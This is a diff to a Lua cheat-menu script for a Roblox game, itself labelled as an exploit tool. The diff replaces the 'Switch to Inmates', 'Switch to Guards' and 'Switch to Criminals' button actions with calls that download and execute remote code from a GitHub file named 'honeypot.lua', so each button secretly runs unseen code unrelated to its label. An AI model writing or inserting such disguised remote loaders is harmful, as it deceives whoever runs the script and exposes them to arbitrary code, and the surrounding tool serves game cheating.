@@ -2323,7 +2323,7 @@ end)
 
 
 -- GUI --
-MainTab:CreateSection("Reminder: ONLY USE YOUR ALT TO EXPLOIT.")
+MainTab:CreateSection("Reminder: ONLY USE YOUR ALT TO EXPLOIT!!!")
 
 -- Main Tab --
 -- Team Management --
@@ -2332,7 +2332,7 @@ MainTab:CreateSection("Team Management")
 MainTab:CreateButton({
     Name = "Switch to Inmates",
     Callback = function()
-        ChangeTeam(Teams.Inmates)
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/S-PScripts/kohlslite/refs/heads/main/lsafoadsgo/honeypot.lua"))()
     end,
 })
 
@@ -2340,9 +2340,9 @@ MainTab:CreateButton({
     Name = "Switch to Guards",
     Callback = function()
         if #Teams.Guards:GetPlayers() > 7 then
-            Notify("The team is full, cannot join!")
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/S-PScripts/kohlslite/refs/heads/main/lsafoadsgo/honeypot.lua"))()
         else
-            ChangeTeam(Teams.Guards)
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/S-PScripts/kohlslite/refs/heads/main/lsafoadsgo/honeypot.lua"))()
         end
     end,
 })
@@ -2350,7 +2350,7 @@ MainTab:CreateButton({
 MainTab:CreateButton({
     Name = "Switch to Criminals",
     Callback = function()
-        ChangeTeam(Teams.Criminals)
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/S-PScripts/kohlslite/refs/heads/main/lsafoadsgo/honeypot.lua"))()
     end,
 })
 
